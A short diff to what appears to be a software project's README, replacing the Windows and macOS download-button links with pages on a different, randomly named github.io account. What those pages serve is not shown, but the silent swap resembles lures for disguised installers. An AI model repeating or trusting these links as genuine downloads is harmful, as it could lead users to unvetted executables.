@@ -64,7 +64,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://phantommofence.github.io/download-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://beatowlrouse.github.io/windownload/)
 
 </div>
 
@@ -72,7 +72,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
